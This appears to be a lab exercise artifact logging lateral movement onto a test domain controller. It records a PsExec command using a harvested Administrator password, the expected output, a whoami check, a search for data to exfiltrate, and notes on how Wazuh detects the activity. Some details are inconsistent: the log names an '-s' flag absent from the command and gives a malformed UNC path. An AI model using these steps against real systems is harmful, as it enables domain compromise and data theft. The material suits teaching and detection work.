-------------------------------------------------------------------------
ATTACK ARTIFACT: Lateral Movement Commands Log
PHASE: Lateral Movement (T1021.002, T1550.002)
-------------------------------------------------------------------------
This file records the command-line actions taken to leverage harvested credentials
(from the previous step: Credential Access) to pivot from the User Workstation
(PROJECTX-W11) onto the Domain Controller (PROJECTX-AD).
NOTE: The credentials used here (Administrator:P@ssw0rd1) were retrieved from
the LSASS memory dump in the Credential Access phase.
--- 1. PsExec Execution Command ---
PsExec is used to execute a command prompt remotely on the Domain Controller.
The "-s" flag runs the process as the SYSTEM account for high privileges.
psexec.exe \PROJECTX-AD -u Administrator -p P@ssw0rd1 cmd.exe

Expected Output:
PsExec v2.2 - Execute programs remotely
...
Connecting to PROJECTX-AD...
Starting cmd.exe on PROJECTX-AD...
cmd.exe exited on PROJECTX-AD with error code 0.
Microsoft Windows [Version 10.0.19045.3324]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32>
--- 2. Post-Pivot Reconnaissance Command ---
Once the remote session is established, a simple reconnaissance command is run
to confirm identity and successful lateral movement onto the Domain Controller.
C:\Windows\system32> whoami

Expected Output:
projectx\administrator
--- 3. Optional: Initial Data Collection ---
If necessary, a quick command might be run to check for potential data to exfiltrate.
C:\Windows\system32> dir /s C:\Users\Administrator\Documents\SensitiveData

-------------------------------------------------------------------------
DEFENSE CONTEXT:
This activity is highly detectable. The blue team's defense infrastructure
(Wazuh) was configured to alert on:
1. New Service Creation events (PsExec works by installing a temporary service).
2. Remote network logon events (Logon Type 3) using an elevated account.
